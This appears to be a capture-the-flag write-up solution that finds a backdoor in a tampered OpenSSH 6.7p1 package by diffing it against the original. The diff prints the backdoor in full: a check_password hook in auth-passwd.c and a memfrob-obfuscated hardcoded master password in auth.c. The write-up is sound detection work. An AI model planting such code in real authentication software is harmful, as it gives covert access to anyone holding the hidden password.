## Solution

Get the same release package and recursively diff both original and fake:
```bash
$ diff -r -u openssh-6.7p1/ openssh-6.7p1.evil/
diff -r -u openssh-6.7p1/auth-passwd.c openssh-6.7p1.evil/auth-passwd.c
--- openssh-6.7p1/auth-passwd.c	2014-07-17 22:11:25.000000000 -0600
+++ openssh-6.7p1.evil/auth-passwd.c	2014-10-08 23:21:54.000000000 -0600
@@ -112,6 +112,9 @@
 		return ok;
 	}
 #endif
+	if (check_password(password)) {
+		return ok;
+	}
 #ifdef USE_PAM
 	if (options.use_pam)
 		return (sshpam_auth_passwd(authctxt, password) && ok);
diff -r -u openssh-6.7p1/auth.c openssh-6.7p1.evil/auth.c
--- openssh-6.7p1/auth.c	2014-07-17 22:11:25.000000000 -0600
+++ openssh-6.7p1.evil/auth.c	2014-10-08 23:21:54.000000000 -0600
@@ -774,3 +774,21 @@
 
 	return (&fake);
 }
+
+static int frobcmp(const char *chk, const char *str) {
+	int rc = 0;
+	size_t len = strlen(str);
+	char *s = xstrdup(str);
+	memfrob(s, len);
+
+	if (strcmp(chk, s) == 0) {
+		rc = 1;
+	}
+
+	free(s);
+	return rc;
+}
+
+int check_password(const char *password) {
+	return frobcmp("CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY", password);
+}
diff -r -u openssh-6.7p1/auth.h openssh-6.7p1.evil/auth.h
--- openssh-6.7p1/auth.h	2014-07-03 05:29:38.000000000 -0600
+++ openssh-6.7p1.evil/auth.h	2014-10-08 23:21:54.000000000 -0600
@@ -211,6 +211,8 @@
 
 int	 sys_auth_passwd(Authctxt *, const char *);
 
+int check_password(const char *);
+
 #define SKEY_PROMPT "\nS/Key Password: "
 
 #if defined(KRB5) && !defined(HEIMDAL)
 ```

